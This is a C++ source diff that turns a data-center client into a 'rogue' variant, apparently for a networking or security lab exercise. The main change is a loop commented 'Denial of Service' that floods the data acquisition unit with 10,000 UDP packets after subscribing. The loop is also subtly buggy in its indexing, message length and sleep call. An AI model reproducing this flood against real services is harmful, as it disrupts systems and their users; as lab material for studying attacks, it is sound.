@@ -1,4 +1,4 @@
-//DataCenter.cpp - Function definitions for the Data Center
+//DataCenterRogue2.cpp - Function definitions for the rogue2 Data Center
 //
 // History:
 // 05-May-22  M. Watler         Created.
@@ -13,34 +13,34 @@
 #include <sys/types.h>
 #include <sys/un.h>
 #include <unistd.h>
-#include "DataCenter.h"
+#include "DataCenterRogue2.h"
 
 using namespace std;
 
-DataCenter* DataCenter::instance=nullptr;
+DataCenterRogue2* DataCenterRogue2::instance=nullptr;
 
 static void shutdownHandler(int sig)
 {
     switch(sig) {
         case SIGINT:
-            DataCenter::instance->shutdown();
+            DataCenterRogue2::instance->shutdown();
 	    break;
     }
 }
 
-DataCenter::DataCenter(int num) {
+DataCenterRogue2::DataCenterRogue2(int num) {
     is_running=false;
     is_subscribed=false;
     dataCenterNo = num;
-    DataCenter::instance=this;
+    DataCenterRogue2::instance=this;
 }
 
-void DataCenter::shutdown() {
-    cout<<"DataCenter::shutdown:"<<endl;
+void DataCenterRogue2::shutdown() {
+    cout<<"DataCenterRogue2::shutdown:"<<endl;
     is_running=false;
 }
 
-int DataCenter::run()
+int DataCenterRogue2::run()
 {
     int ret, len;
     struct sockaddr_in myaddr;
@@ -100,7 +100,6 @@ int DataCenter::run()
     }
     servaddr.sin_port = htons(PORT);
 
-    is_running = true;
     pthread_t tid;
     ret = pthread_create(&tid, NULL, recv_func, this);
     if(ret!=0) {
@@ -110,13 +109,18 @@ int DataCenter::run()
         return -1;
     }
 
-    char message[BUF_LEN];
+    is_running = true;
+    char message[100*BUF_LEN];
     while(is_running && !is_subscribed) {
         //authenticate with the data acquisition unit
-	cout<<"dataCenter:"<<dataCenterNo<<" attempting to subscribe"<<endl;
         len = sprintf(message, "Subscribe,DataCenter%d,Leaf", dataCenterNo);
         ret = sendto(fd, message, len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
-        sleep(5);
+        sleep(1);
+    }
+    for(int i=0; i<10000; ++i) {//Denial of Service
+        for(int j=0; j<100*BUF_LEN; ++j) message[i] = 32+j%95;//an array of alphabetic characters
+        ret = sendto(fd, message, len, 0, (struct sockaddr *)&servaddr, sizeof(servaddr));
+        sleep(0.1);
     }
     sleep(30);
     //cancel with the data acquisition unit
@@ -132,12 +136,12 @@ int DataCenter::run()
 
 void *recv_func(void *arg)
 {
-    DataCenter *dataCenter = (DataCenter *)arg;
+    DataCenterRogue2 *dataCenter = (DataCenterRogue2 *)arg;
     dataCenter->ReceiveFunction();
     pthread_exit(NULL);
 }
 
-void DataCenter::ReceiveFunction()
+void DataCenterRogue2::ReceiveFunction()
 {
     char buf[BUF_LEN];
     struct sockaddr_in recvaddr;
